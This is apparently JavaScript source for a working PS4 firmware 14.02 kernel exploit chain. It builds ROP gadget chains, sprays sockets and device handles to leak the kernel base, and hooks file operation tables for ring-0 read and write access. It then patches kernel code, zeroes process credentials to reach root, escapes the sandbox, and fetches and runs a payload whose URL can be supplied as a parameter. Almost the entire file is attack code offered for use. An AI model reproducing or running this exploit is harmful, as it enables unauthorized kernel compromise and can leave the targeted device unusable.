  c.hex("4885c9").hex("741d").hex("486316").hex("4883c604").hex("48ffc9");
  c.hex("4d8b1cd0").hex("4d85db").hex("7406").hex("4d395308").hex("74e2");
  c.hex("ffc0").hex("ebde");
  c.hex("48ba").qw(plus(room, OUT)).hex("488902");
  if (!k.run()) return null;
  return rd4(plus(room, OUT));
}

function teardown(k, kbase, ofs, devs, queues, room) {
  const kat = function (rva) { return plus(kbase, rva); };
  const fileOf = function (fd) { return k.read_v(plus(ofs, fd * 8)); };

  const stub = kat(PADDING + OFF_STUB);
  const dtab = kat(PADDING + OFF_DEVS);
  const qtab = kat(PADDING + OFF_QUEUES);

  say("[t] reading the padding at " + text(stub));
  const there = k.read_v(stub);
  if (!there) { say("[t] kernel text not readable at " + text(stub)); return false; }
  say("[t] it holds " + text(there));
  if ((there.low >>> 0) === (RET0 >>> 0)) {
    say("[t] the stub is already there from an earlier run");
  } else if (isZero(there)) {
    if (!k.write_v(stub, v(RET0, 0))) { say("[t] kernel text not writable"); return false; }
    const back = k.read_v(stub);
    if (!back || (back.low >>> 0) !== (RET0 >>> 0)) { say("[t] the stub did not stick"); return false; }
  } else {
    say("[t] something else is at " + text(stub) + ": " + text(there)); return false;
  }

  const clone = function (from, to, what) {
    for (let i = 0; i <= 10; i++) {
      let q = k.read_v(plus(from, i * 8));
      if (!q) { say("[t] " + what + " unreadable at +0x" + (i * 8).toString(16)); return false; }
      if (i === 7) q = stub;
      if (!k.write_v(plus(to, i * 8), q)) { say("[t] " + what + " not writable"); return false; }
    }
    const c = k.read_v(plus(to, 0x38));
    return c !== null && same(c, stub);
  };

  const original = function (list, copy) {
    for (let i = 0; i < list.length; i++) {
      const f = fileOf(list[i]);
      if (f && inHeap(f)) {
        const cur = k.read_v(plus(f, 0x08));
        if (cur && inText(cur) && !same(cur, copy)) return cur;
      }
    }
    return null;
  };
  const ready = function (copy) {
    const c = k.read_v(plus(copy, 0x38));
    return c !== null && same(c, stub);
  };
  const rehang = function (list, from, copy) {
    let moved = 0;
    for (let i = 0; i < list.length; i++) {
      const f = fileOf(list[i]);
      const cur = (f && inHeap(f)) ? k.read_v(plus(f, 0x08)) : null;
      if (cur && same(cur, copy)) moved++;
      else if (cur && from && same(cur, from) && k.write_v(plus(f, 0x08), copy)) moved++;
    }
    return moved;
  };

  say("[t] looking for the device table across " + devs.length + " handles");
  const devOps = original(devs, dtab);
  if (devOps) {
    if (!ready(dtab) && !clone(devOps, dtab, "device table")) return false;
  } else if (!ready(dtab)) {
    say("[t] no device table to copy -- nothing done"); return false;
  }
  let moved = rehangRing0(k, room, ofs, devs, devOps, dtab);
  if (moved === null) { say("[t] rehanging one at a time"); moved = rehang(devs, devOps, dtab); }
  say("[t] " + moved + " of " + devs.length + " handles on the copy");

  let movedq = 0;
  if (queues && queues.length) {
    const qOps = original(queues, qtab);
    if (qOps && !same(qOps, devOps || qtab)) {
      if (ready(qtab) || clone(qOps, qtab, "queue table")) movedq = rehang(queues, qOps, qtab);
    } else if (ready(qtab)) movedq = queues.length;
  }
  say("[t] " + movedq + " of " + (queues ? queues.length : 0) + " queues on the copy");

  let notes = 0;
  for (let i = 0; queues && i < queues.length; i++) {
    const f = fileOf(queues[i]);
    if (!f || !inHeap(f)) continue;
    const kq = k.read_v(f);
    if (!kq || !inHeap(kq)) continue;
    const w = k.read_v(plus(kq, 0xa0));
    if (!w) continue;
    if ((w.hi >>> 0) !== 0) { if (k.write_v(plus(kq, 0xa0), v(w.low, 0))) notes++; }
    else notes++;
  }
  say("[t] note lists emptied on " + notes + " of " + (queues ? queues.length : 0) + " queues");

  let left = countOffRing0(k, room, ofs, devs, dtab);
  if (left === null) {
    left = 0;
    for (let i = 0; i < devs.length; i++) {
      const f = fileOf(devs[i]);
      const cur = (f && inHeap(f)) ? k.read_v(plus(f, 0x08)) : null;
      if (!(cur && same(cur, dtab))) left++;
    }
  }
  if (left === 0 && moved > 0) { say("[t] all " + devs.length + " handles are on the copy"); return true; }
  say("[t] " + left + " handles are still on the original -- the page must not go away");
  return false;
}

export function probeAfterglow(ctx) {
  STATE.ctx = ctx;
  const out = { ok: false, reasons: [] };
  const no = function (why) { out.reasons.push(why); };

  const noStub = seedStubs();
  out.stubs = noStub.length ? ("missing " + noStub.join(",")) : "all resolved";
  if (noStub.length) no("no libkernel stub for syscall " + noStub.join(","));

  let lib = findLib("libSceLibcInternal.sprx");
  if (!lib.base) {
    const m = findLibByShape();
    if (m.base) { lib = { base: m.base, at: "gadget shape", count: lib.count, seen: lib.seen }; }
    else say("AG libc: " + m.note + " | entries=" + m.entries
             + " first=[" + m.first.join(" ") + "]");
  }
  const libc = lib.base;
  out.libc = libc ? (text(libc) + " via " + lib.at) : "not found";
  out.modules = lib.count;
  if (!libc) {
    no(lib.note || "libSceLibcInternal is not mapped");
    say("probe: stubs=" + out.stubs + " modules=" + lib.count + " rv=" + lib.rv
        + " seen=[" + lib.seen.join(" ") + "] -- " + out.reasons.join("; "));
    return out;
  }

  let missing = null;
  for (const name in GADGETS) {
    const want = unhex(GADGETS[name][1]);
    if (!sameBytes(rdbuf(plus(libc, GADGETS[name][0]), want.length), want)) { missing = name; break; }
  }
  out.gadgets = missing ? ("missing " + missing) : "all present";
  if (missing) no("gadget " + missing + " is missing -- different libc build");

  let dirty = 0;
  for (let off = 0; off <= HOST.last - HOST.free - 4; off += 4) {
    if (rd4(plus(libc, HOST.free + off)) !== 0) dirty++;
  }
  out.tail = (HOST.last - HOST.free) + " bytes, " + dirty + " dwords non zero";
  if (dirty) no("the spare room behind libc is occupied");

  let node = null;
  for (let i = 0; i < PROBE_NODES.length; i++) {
    const fd = sc(S.open, cstr(PROBE_NODES[i]).at, 0).i32;
    if (fd >= 0) { node = PROBE_NODES[i]; break; }
  }
  out.probeNode = node;
  if (!node) no("no usable device node for the probe descriptor");

  const held = [];
  for (let i = 0; i < 20; i++) {
    const fd = sc(S.open, cstr("/dev/apm").at, 0).i32;
    if (fd < 0) break;
    held.push(fd);
  }
  out.apm = held.length ? (held.length + " clones held") : ("refused, errno " + host().errno());
  if (!held.length) no("/dev/apm cannot be opened in this sandbox");

  const open = [], refused = [];
  for (let u = 0; u < 32; u++) {
    const fd = sc(S.open, cstr("/dev/apm" + u).at, 0).i32;
    if (fd >= 0) { open.push(u); sc(S.close, fd); }
    else if (refused.length < 3) refused.push(u + ":e" + host().errno());
  }
  out.units = open.length;
  out.unitList = open.length ? open.join(",") : "none";
  out.unitRefused = refused.join(" ") || "-";
  if (open.length < 3) no("only " + open.length + " apm units with " + held.length + " clones held");

  const pin = pinCore();
  out.pin = pin.ok ? ("core " + pin.core + " of [" + pin.allowed + "]") : ("FAILED: " + pin.note);
  if (!pin.ok) no("cannot pin to a cpu: " + pin.note);

  const socks = [];
  for (let i = 0; i < TUNE.sprays; i++) {
    const fd = sc(S.socket, 2, 2, 0).i32;
    if (fd < 0) break;
    socks.push(fd);
  }
  out.udp = socks.length;

  if (socks.length) {
    const body = alloc(TUNE.object); body.u8.fill(0);
    const req = alloc(40);
    req.dv.setUint32(0, 1, true);
    pokeAt(req, 8, alloc(16).at);
    req.dv.setUint32(16, 16, true);
    pokeAt(req, 24, body.at);
    req.dv.setUint32(32, TUNE.object, true);

    const stub = stubFor(S.setsockopt);
    const nb = (host().prepareMany && host().runPrepared && stub) ? (STATE.batch || TUNE.batch) : 0;
    let t0, t1;
    if (nb) {
      const calls = [];
      for (let i = 0; i < socks.length; i++) calls.push([stub, [socks[i], 17, 128, req.at, 40]]);
      const fertig = [];
      for (let i = 0; i < calls.length; i += nb) {
        try { fertig.push(host().prepareMany(calls.slice(i, i + nb))); }
        catch (e) { fertig.length = 0; break; }
      }
      if (fertig.length) {
        host().runPrepared(fertig[0]);
        t0 = performance.now();
        for (let i = 0; i < fertig.length; i++) host().runPrepared(fertig[i]);
        t1 = performance.now();
        out.window = (t1 - t0).toFixed(2) + " ms in " + fertig.length + " entries";
      }
    }
    if (out.window === undefined) {
      t0 = (typeof performance !== "undefined") ? performance.now() : Date.now();
      for (let i = 0; i < socks.length; i++) sc(S.setsockopt, socks[i], 17, 128, req.at, 40);
      t1 = (typeof performance !== "undefined") ? performance.now() : Date.now();
      out.window = (t1 - t0).toFixed(1) + " ms, one entry each (no batching)";
    }
  } else out.window = "not measured";

  for (let i = 0; i < socks.length; i++) sc(S.close, socks[i]);
  if (socks.length < TUNE.sprays) {
    no("only " + socks.length + " udp sockets, " + TUNE.sprays + " is a hard floor");
  }

  out.ok = out.reasons.length === 0;

  say("probe libc   " + out.libc);
  say("probe gadget " + out.gadgets + ", tail " + out.tail);
  say("probe apm    " + out.apm + ", node " + out.probeNode);
  say("probe units  " + out.units + " open: " + out.unitList);
  say("probe refused " + out.unitRefused);
  say("probe pin    " + out.pin);
  say("probe window " + out.window);
  say("probe UDP    " + out.udp + " of " + TUNE.sprays + " needed");
  say("probe SHOTS  " + out.units + " units, a run needs 3");
  if (out.ok) say("probe VERDICT usable");
  else for (let i = 0; i < out.reasons.length; i++) say("probe BLOCKED " + out.reasons[i]);
  return out;
}

async function attempt(ctx, opts) {
  STATE.ctx = ctx;
  opts = opts || {};
  STATE.retry = false;
  say("PhantomHEN -- iDntUseModz -- PS4 14.02 exploit chain");
  if (ctx.state && ctx.state.fw && ctx.state.fw !== "14.02") {
    say("[pre] This rebuilt payload requires PS4 14.02 -- stopping");
    return false;
  }

  const missing = seedStubs();
  if (missing.length) {
    say("  no libkernel stub for syscall " + missing.join(",") + " -- stopping here");
    return false;
  }

  // Use payload pre-fetched at page load (before exploit trashed networking).
  // Fall back to a fresh fetch only if the early load failed.
  const payloadUrl = (ctx.params && ctx.params.get("payload")) || REBUILT_PAYLOAD;
  let prefetchedPayload = (ctx.earlyPayload && ctx.earlyPayload.length > 0)
    ? ctx.earlyPayload
    : await fetchBytes(payloadUrl, "pre");
  if (!isPhantomHEN(prefetchedPayload)) {
    say("[pre] " + payloadUrl + " is missing or is not our PhantomHEN image -- stopping");
    return false;
  }
  try {
    prefetchedPayload = configurePhantomHEN(prefetchedPayload);
  } catch (error) {
    say("[pre] Invalid rebuilt payload: " + (error && error.message));
    return false;
  }
  say("[pre] " + prefetchedPayload.length + " bytes ready for PS4 14.02");

  const pin = pinCore();
  if (!pin.ok) {
    say("  cpu pin failed (" + pin.note + ") -- refusing to go on.");
    say("  Unpinned, the free and the refill land in different per cpu buckets,");
    say("  the hole is filled by somebody else, and ring 0 continues on that");
    say("  stranger's stack pointer. That is a dead console, not a bad run.");
    return false;
  }
  say("  pinned to core " + pin.core + " of [" + pin.allowed + "]");

  {
    const m0 = sc(S.mmap, 0, 0x4000, 3, 0x1002, -1, 0);
    if (m0.i32 !== -1 && sc(S.mprotect, v(m0.lo, m0.hi), 0x4000, 7).i32 === 0) {
      say("  this kernel is already open -- a run has succeeded on this boot.");
      say("  Not firing again; reboot the console for a fresh one.");
      return false;
    }
  }

  let lib = findLib("libSceLibcInternal.sprx");
  if (!lib.base) lib = findLibByShape();
  const libc = lib.base;
  if (!libc) { say("  " + (lib.note || "libc is not mapped")); return false; }

  const gad = {};
  for (const name in GADGETS) {
    const want = unhex(GADGETS[name][1]);
    const at = plus(libc, GADGETS[name][0]);
    if (!sameBytes(rdbuf(at, want.length), want)) {
      say("  gadget " + name + " is missing -- this is not the libc build we know");
      return false;
    }
    gad[name] = at;
  }

  const shot = shooter(gad);
  const hostPage = plus(libc, HOST.page), hostFree = plus(libc, HOST.free);

  let kbase = STATE.base;
  if (kbase) {
    say("[1] base " + text(kbase) + ", carried over from this boot");
  } else {
    const win = alloc(TUNE.window + 16);
    wipe(win, TUNE.window + 16);

    say("[1] firing first take ...");
    const r = shot.take(function (c) {

      c.gad("rcx"); c.num(14); c.gad("shr"); c.gad("shl");
      c.grab(win.at, TUNE.window);
    });
    say("[1] take returned " + r + ", scanning " + TUNE.window + " bytes");

    const at = function (off) { return qAt(win, off); };

    let found = null;
    for (let off = 0; off <= TUNE.window - 0x20; off += 8) {
      const a = at(off);
      if (a.hi === 0xffffffff) {
        const b = at(off + 8), c2 = at(off + 0x10), d = at(off + 0x18);
        if (b.hi === 0xffffffff && c2.hi === 0xffffffff && d.hi === 0xffffffff
            && ((b.low - a.low) >>> 0) === 0x20
            && ((c2.low - a.low) >>> 0) === 0x40
            && ((d.low - a.low) >>> 0) === 0x50) { found = a; break; }
      }
    }

    let voted = null;
    {
      const mark = K.anchor % 0x4000, tally = {};
      for (let off = 0; off <= TUNE.window - 8; off += 8) {
        const a = at(off);
        if (a.hi === 0xffffffff && a.low !== 0xffffffff && a.low % 0x4000 === mark) {
          const b = (a.low - K.anchor) >>> 0;
          if (b % 0x4000 === 0) tally[b] = (tally[b] || 0) + 1;
        }
      }
      let best = null, top = 0, second = 0;
      for (const b in tally) {
        const n = tally[b];
        if (n > top) { second = top; best = Number(b); top = n; }
        else if (n > second) second = n;
      }
      if (best !== null && top > second) voted = v(best + K.anchor, 0xffffffff);
    }

    if (found && voted && !same(found, voted)) {
      say("[1] the two readings disagree: " + text(found) + " against " + text(voted)
          + " -- stopping here");
      return false;
    }
    found = found || voted;
    if (found && ((found.low - K.anchor) >>> 0) % 0x4000 !== 0) {
      const rem = ((found.low - K.anchor) >>> 0) % 0x4000;
      const delta = rem <= 0x2000 ? rem : -(0x4000 - rem);
      const oldA = K.anchor;
      K.anchor += delta;
      say("[1] anchor grid-shifted " + delta + ": 0x" + oldA.toString(16) + " -> 0x" + K.anchor.toString(16));
    }

    say("[1] leak: queue=" + r + " sprays=" + shot.sprayed + " anchor="
        + (found ? text(found) : "missed")
        + ((found && voted && same(found, voted)) ? " (both readings agree)" : ""));
    if (!found) {
      if (r === null && shot.sprayed === 0) {
        say("    no free apm unit left -- this boot is spent, reboot the console.");
      } else {
        say("    the spray did not take");
        STATE.retry = true;
      }
      return false;
    }
    kbase = plus(found, -K.anchor);
    STATE.base = kbase;
    say("    base " + text(kbase));
  }

  {
    const SCAN_WIN = 0x1000;
    const SCAN_PRE = 0x200;
    const scanBuf = alloc(SCAN_WIN + 16);
    wipe(scanBuf, SCAN_WIN + 16);
    const scanRef = alloc(16);
    pokeAt(scanRef, 0, plus(kbase, K.swap_rbp - SCAN_PRE));

    const scanR = shot.take(function (c) {
      c.load_rax(scanRef.at);
      c.grab(scanBuf.at, SCAN_WIN);
    }, 0x400);

    say("[1b] gadget scan: " + (scanR === null ? ("null -- " + shot.why) : ("chain=" + scanR)));

    if (ran(scanR)) {
      const sb = rdbuf(scanBuf.at, SCAN_WIN);
      let hit = -1;
      for (let i = 0; i < SCAN_WIN - 2; i++) {
        if (sb[i] === 0x4E && sb[i + 1] === 0x95 && sb[i + 2] === 0xC3) { hit = i; break; }
      }
      if (hit >= 0) {
        const realRVA = K.swap_rbp - SCAN_PRE + hit;
        const delta = realRVA - K.swap_rbp;
        say("[1b] swap_rbp at scan+" + hit + " rva=0x" + realRVA.toString(16)
            + (delta !== 0 ? (" (shifted " + delta + ")") : " (same)"));
        K.swap_rbp = realRVA;
      } else {
        say("[1b] swap_rbp gadget was not verified -- stopping");
        return false;
      }
    } else {
      say("[1b] scan shot missed -- stopping before using the gadget");
      STATE.retry = true;
      return false;
    }
  }

  const kat = function (rva) { return plus(kbase, rva); };

  let probe = -1, node = null;
  for (let i = 0; i < PROBE_NODES.length && probe < 0; i++) {
    probe = sc(S.open, cstr(PROBE_NODES[i]).at, 0).i32;
    if (probe >= 0) node = PROBE_NODES[i];
  }
  if (probe < 0) { say("[2] no device node opened for the probe descriptor"); return false; }

  for (let off = 0; off <= HOST.last - HOST.free - 4; off += 4) {
    if (rd4(plus(hostFree, off)) !== 0) {
      say("[2] the spare room behind libc is occupied -- nothing written");
      return false;
    }
  }
  say("[2] probe fd " + probe + " on " + node + ", " + (HOST.last - HOST.free)
      + " bytes of spare room behind libc");

  let reach = TUNE.entries;
  if (MAPS) {
    for (let i = 0; i < MAPS.length; i++) {
      const a0 = MAPS[i][0], b0 = MAPS[i][1];
      const above = a0.hi < hostPage.hi || (a0.hi === hostPage.hi && a0.low <= hostPage.low);
      const below = hostPage.hi < b0.hi || (hostPage.hi === b0.hi && hostPage.low < b0.low);
      if (above && below) { reach = Math.min(TUNE.entries, i + 2); break; }
    }
  }
  say("[3a] walking " + reach + " of " + TUNE.entries + " entries"
      + (MAPS ? (", " + MAPS.length + " mapped") : ""));

  const note = alloc(128), ftab = alloc(0x100);
  const maps = alloc(TUNE.entries * TUNE.stride + 0x100);
  wipe(note, 128); wipe(ftab, 0x100); wipe(maps, TUNE.entries * TUNE.stride);

  const merged = ((ctx.params && ctx.params.get("shots")) || "3") === "3";

  const walkLoop = function (c) {
    for (let k = 0; k < reach; k++) {
      const src = c.grab(plus(maps.at, k * TUNE.stride), TUNE.stride);
      c.load_rax(c.where(src));
      c.gad("load8");
    }
  };

  const r2 = shot.take(function (c) {
    c.slot(kat(K.swap_rbp));
    c.save_rax(note.at);
    c.slot(kat(K.swap_rbp));
    c.load_rax(note.at);
    c.follow(0);
    c.follow(-0x148);
    c.save_rax(plus(note.at, 8));
    c.gad("load8");
    c.save_rax(plus(note.at, 16));
    c.follow(0x48);
    c.follow(0);
    c.follow(probe * 8);
    c.save_rax(plus(note.at, 40));
    c.gad("load8");
    c.save_rax(plus(note.at, 48));
    c.grab(ftab.at, 0x58);

    if (merged) {
      c.load_rax(plus(note.at, 16));
      c.follow(0x168);
      c.gad("load8");
      walkLoop(c);
    }
  }, merged ? 0x1000 + reach * 0x100 : 0x1000);

  const file = qAt(note, 40), ops = qAt(note, 48);
  say("[3] chain=" + (r2 === null ? ("null -- " + shot.why) : r2) + " file=" + text(file) + " ops=" + text(ops));
  if (!inHeap(file) || !inText(ops)) {
    say("    handles implausible -- nothing written"); STATE.retry = true; return false;
  }

  let sane = 0;
  for (let k = 0; k < 10; k++) if (inText(qAt(ftab, k * 8))) sane++;
  if (sane < 6) { say("    operation table unusable, " + sane + " of 10"); return false; }

  let r2b = -1;
  if (!merged) {
    r2b = shot.take(function (c) {
      c.slot(kat(K.swap_rbp));
      c.save_rax(note.at);
      c.slot(kat(K.swap_rbp));
      c.load_rax(note.at);
      c.follow(0);
      c.follow(-0x148);
      c.gad("load8");
      c.follow(0x168);
      c.gad("load8");
      walkLoop(c);
    }, 0x1000 + reach * 0x100);
    say("[3b] address space walked, chain="
        + (r2b === null ? ("null -- " + shot.why) : r2b));
    if (!ran(r2b)) {
      say("    the chain did not run -- the hole was refilled with a real object");
      STATE.retry = true;
      return false;
    }
  }

  let hit = null, walked = 0;
  for (let k = 0; k < reach; k++) {
    const from = qAt(maps, k * TUNE.stride + 0x20);
    const upto = qAt(maps, k * TUNE.stride + 0x28);
    if (from.low === 0 && from.hi === 0 && upto.low === 0 && upto.hi === 0) break;

    if (upto.hi - from.hi > 0x100) break;
    walked = k + 1;
    const above = from.hi < hostPage.hi || (from.hi === hostPage.hi && from.low <= hostPage.low);
    const below = hostPage.hi < upto.hi || (hostPage.hi === upto.hi && hostPage.low < upto.low);
    if (above && below) { hit = k; break; }
  }
  if (hit === null) { say("[4] no mapping covers the host page, " + walked + " walked"); return false; }

  if (hit === 0) { say("[4] the host page is the first mapping -- cannot address it"); return false; }

  const rights = maps.dv.getUint32(hit * TUNE.stride + 0x5c, true);
  const locked = maps.dv.getUint32(hit * TUNE.stride + 0x88, true);
  const here = qAt(maps, (hit - 1) * TUNE.stride + 0x08);
  const now = rights % 256, ceiling = Math.floor(rights / 256) % 256;

  say("[4] mapping " + hit + " at " + text(here) + " rights=0x" + now.toString(16)
      + " ceiling=0x" + ceiling.toString(16));
  if (locked % 2 === 1 || !inHeap(here) || now === 0 || ceiling === 0
      || Math.floor(now / 4) % 2 !== 1) {
    say("    not the mapping we want -- nothing written"); return false;
  }

  let widened = rights;
  if (Math.floor(widened / 0x200) % 2 === 0) widened += 0x200;

  const wRights = alloc(16); wRights.dv.setUint32(0, widened >>> 0, true);
  const wTable = alloc(16); pokeAt(wTable, 0, ftab.at);
  pokeAt(ftab, 0x18, hostFree);

  const r3 = shot.take(function (c) {
    c.put(plus(here, 0x5c), wRights.at, 4);
    c.put(plus(file, 0x08), wTable.at, 8);
  });
  say("[5] widen and hook: " + (r3 === null ? ("null -- " + shot.why) : r3));
  if (!ran(r3)) { say("    chain did not run -- kernel untouched"); STATE.retry = true; return false; }

  if (sc(S.mprotect, hostPage, 0x1000, 7).i32 !== 0) {
    say("    page did not turn writable -- not calling into it"); return false;
  }
  const boot = unhex(BOOTSTRAP);

  if (K.anchor === 0xe6c30) {
    for (let bi = 0; bi < boot.length - 6; bi++) {
      if (boot[bi] === 0xc6 && boot[bi+1] === 0x81 && boot[bi+3] === 0xaa
          && boot[bi+4] === 0x1f && boot[bi+5] === 0x00 && boot[bi+6] === 0x37) {
        boot[bi+3] = 0xae;
        say("[5b] bootstrap fixup: offset byte at +" + bi + " shifted aa->ae (+0x400)");
      }
    }
  }

  wrbuf(hostFree, boot);
  if (!sameBytes(rdbuf(hostFree, boot.length), boot)) {
    say("    bootstrap did not stick"); return false;
  }

  const m1 = sc(S.mmap, 0, 0x4000, 3, 0x1002, -1, 0);
  const before = sc(S.mprotect, v(m1.lo, m1.hi), 0x4000, 7).i32;
  sc(S.ioctl, probe, 0xC0000000 + (8 * 0x10000) + (97 * 0x100) + 1, alloc(64).at);
  const m2 = sc(S.mmap, 0, 0x4000, 3, 0x1002, -1, 0);
  const after = sc(S.mprotect, v(m2.lo, m2.hi), 0x4000, 7).i32;

  const k = openRing0(hostFree);
  const thread = (before !== 0 && after === 0) ? k.thread() : null;
  const gated = thread !== null && inHeap(thread);

  if (!(gated && k.write_v(plus(file, 0x08), ops))) {
    const wOld = alloc(16); pokeAt(wOld, 0, ops);
    shot.take(function (c) { c.put(plus(file, 0x08), wOld.at, 8); });
  }
  sc(S.close, probe);

  if (before === 0 || after !== 0) {
    say("[6] kernel unchanged, rwx " + before + " before and " + after + " after -- "
        + shot.fired + " shots used");
    return false;
  }
  say("[6] kernel patched, rwx is open -- " + shot.fired + " shots used");

  if (!gated) { say("[7] the gate did not answer"); return false; }
  const base2 = k.base();
  if (!base2 || !same(base2, kbase)) {
    say("[7] the gate reports " + (base2 ? text(base2) : "nothing")
        + ", the leak said " + text(kbase));
    return false;
  }
  say("[7] gate is live, thread " + text(thread));

  const failOut = function (why) {
    say(why);
    try {
      const p0 = k.read_v(plus(thread, 0x08));
      const f0 = p0 && k.read_v(plus(p0, 0x48));
      const o0 = f0 && k.read_v(f0);
      if (o0 && inHeap(o0)
          && teardown(k, kbase, o0, shot.devs, shot.queues, hostFree))
        say("handles defused after the failure -- this page may close");
      else
        say("the handles are NOT defused -- do not close this page, cold boot instead");
    } catch (e) {
      say("teardown threw: " + ((e && e.message) || e));
    }
    return false;
  };

  {
    const SHIFTS = [0, 16, 768, 864, 880, 992, 1024, 1152, 1200, 1280];
    let adj = 0;
    for (let i = 0; i < PATCHES.length; i++) {
      const off = PATCHES[i][0];
      const nb = unhex(PATCHES[i][1]);
      const cur = k.read(kat(off), nb.length);
      if (cur && sameBytes(cur, nb)) continue;

      const exp = unhex(PATCHES[i][3]);
      const ec = k.read(kat(off), exp.length);
      if (ec && sameBytes(ec, exp)) continue;

      let best = -1;
      for (let s = 1; s < SHIFTS.length; s++) {
        const t = k.read(kat(off + SHIFTS[s]), exp.length);
        if (t && sameBytes(t, exp)) { best = SHIFTS[s]; break; }
      }
      if (best > 0) {
        say("[7b] " + PATCHES[i][2] + " shifted +" + best + " -> 0x" + (off + best).toString(16));
        PATCHES[i][0] = off + best;
        adj++;
      } else {
        say("[7b] " + PATCHES[i][2] + " at 0x" + off.toString(16) + " unresolved");
      }
    }
    if (adj > 0) say("[7b] adjusted " + adj + " patch offsets for this firmware");
  }

  /* Bisect knobs stay: ?agpatches=0 drops the whole table, ?agskip=0,1,2
     drops chosen indices. Default applies all of it. */
  let done = 0, failed = null;
  const agAll = ctx.params && ctx.params.get("agpatches") === "0";
  const agSkipRaw = ctx.params ? ctx.params.get("agskip") : null;
  const skipSet = agAll ? new Set(PATCHES.map(function (p, i) { return i; }))
    : new Set(String(agSkipRaw || "")
        .split(",").filter(function (s) { return s !== ""; }).map(Number));
  const list = PATCHES.filter(function (p, i) { return !skipSet.has(i); });
  if (!list.length) {
    say("[8] patch table skipped entirely -- gate and defuse still run");
  } else {
    if (!k.apply(kbase, list)) { return failOut("[8] the patch pass did not return"); }
    for (let i = 0; i < list.length; i++) {
      const bytes = unhex(list[i][1]);
      const got = k.read(kat(list[i][0]), bytes.length);
      if (got && sameBytes(got, bytes)) done++; else failed = failed || list[i][2];
    }
    say("[8] " + done + " of " + list.length + " kernel patches in place"
        + (skipSet.size ? " -- skipped [" + Array.from(skipSet).join(",") + "]" : "")
        + (failed ? (" -- first missing: " + failed) : ""));
    if (done < list.length) { return failOut("     refusing to go on with a half patched kernel"); }
  }

  const proc = k.read_v(plus(thread, 0x08));
  const fdt = proc && k.read_v(plus(proc, 0x48));
  const ofs = fdt && k.read_v(fdt);
  if (!ofs || !inHeap(ofs)) { return failOut("[9] descriptor table unreadable"); }

  const ucred = proc && k.read_v(plus(proc, 0x40));
  if (!ucred || !inHeap(ucred)) { return failOut("[9] no credentials"); }

  const z4 = new Uint8Array([0, 0, 0, 0]);
  const offs = [0x04, 0x08, 0x0c, 0x14];
  for (let i = 0; i < offs.length; i++) k.write(plus(ucred, offs[i]), z4);
  k.write(plus(ucred, 0x10), new Uint8Array([1, 0, 0, 0]));

  const prison0 = k.read_v(kat(K.prison0));
  if (!prison0 || !inText(prison0)) {
    return failOut(
      "[9] prison0 pointer is " + (prison0 ? text(prison0) : "unreadable")
        + " -- not touching credentials",
    );
  }
  k.write_v(plus(ucred, 0x30), prison0);
  const caps = new Uint8Array(16); caps.fill(0xff);
  k.write(plus(ucred, 0x60), caps);

  const rootvnode = k.read_v(kat(K.rootvnode));
  if (!rootvnode || !inHeap(rootvnode)) { return failOut("[9] rootvnode is not set"); }
  k.write_v(plus(fdt, 0x10), rootvnode);
  k.write_v(plus(fdt, 0x18), rootvnode);

  if (sc(S.getuid).i32 !== 0) { return failOut("[9] still not root"); }
  say("[9] jailbroken, uid 0");

  const iface = {
    base: kbase,
    curproc: proc,
    curproc_fd: fdt,
    curproc_ofiles: ofs,
    thread: thread,
    read: function (at, len) {
      const out = new Uint8Array(len);
      let got = 0;
      while (got < len) {
        const n = Math.min(len - got, STAGE_MAX);
        const s = k.read(plus(at, got), n);
        if (!s) return null;
        out.set(s, got); got += n;
      }
      return out;
    },
    write: function (at, bytes) {
      let done2 = 0;
      while (done2 < bytes.length) {
        const n = Math.min(bytes.length - done2, STAGE_MAX);
        if (!k.write(plus(at, done2), bytes.subarray(done2, done2 + n))) return false;
        done2 += n;
      }
      return true;
    },
    read8: function (at) { return k.read_v(at); },
    write8: function (at, q) { return k.write_v(at, q); },

    data_base: kbase,
  };

  iface.devs = shot.devs;
  iface.queues = shot.queues;
  if (ctx.state) ctx.state.afterglow = iface;

  say("[10] kernel interface is live -- " + shot.devs.length + " handles held open");

  iface.defused = teardown(k, kbase, ofs, shot.devs, shot.queues, hostFree);
  say(iface.defused
      ? "handles defused -- this page may close"
      : "the handles are NOT defused -- do not let this page close");

  if (!iface.defused) {
    say("[p] Handles are not defused; holding the payload launch");
    return false;
  }

  if (ctx.params && ctx.params.get("shnload") === "0") {
    say("[p] payload skipped by shnload=0 -- kernel stays patched, page holds");
    return true;
  }

  // The supplied variant called loadPayload("debug.bin") at this handoff.
  say("[p] Attempting to load " + payloadUrl);
  try {
    iface.payload = await loadPayload(payloadUrl, prefetchedPayload, hostFree);
    iface.payload_file = payloadUrl;
  } catch (error) {
    say("[p] Payload error: " + (error && error.message));
    iface.payload = false;
  }
  if (!iface.payload) {
    say("[p] " + payloadUrl + " did not start");
    return false;
  }

  say("[p] " + payloadUrl + " thread started; startup stages follow in the log");
  say("========================================");
  say("  KERNEL JAILBREAK COMPLETE -- FW 14.02");
  say("  Patches: " + done + "/" + PATCHES.length);
  say("  Payload: " + payloadUrl);
  say("========================================");
  return iface;
}

export async function runAfterglow(ctx, opts) {
  STATE.ctx = ctx;
  const configured = opts && opts.tries != null ? opts.tries
    : ctx.params && ctx.params.get("attempts");
  const requested = Number(configured == null || configured === "" ? AFTERGLOW_ATTEMPTS : configured);
  const max = Number.isInteger(requested) && requested > 0
    ? Math.min(AFTERGLOW_ATTEMPTS, requested) : AFTERGLOW_ATTEMPTS;
  say("[pre] params " + location.search.slice(0, 200));
  try { say("[pre] ua " + String(navigator.userAgent).slice(0, 120)); } catch (e) {}
  for (let n = 1; n <= max; n++) {
    const r = await attempt(ctx, opts);
    if (r) return r;
    if (!STATE.retry) return false;
    if (n === max) { say("gave up after " + n + " attempts"); return false; }
    say("attempt " + n + " fell short -- going again");
    await new Promise(function (ok) { setTimeout(ok, 400); });
  }
  return false;
}
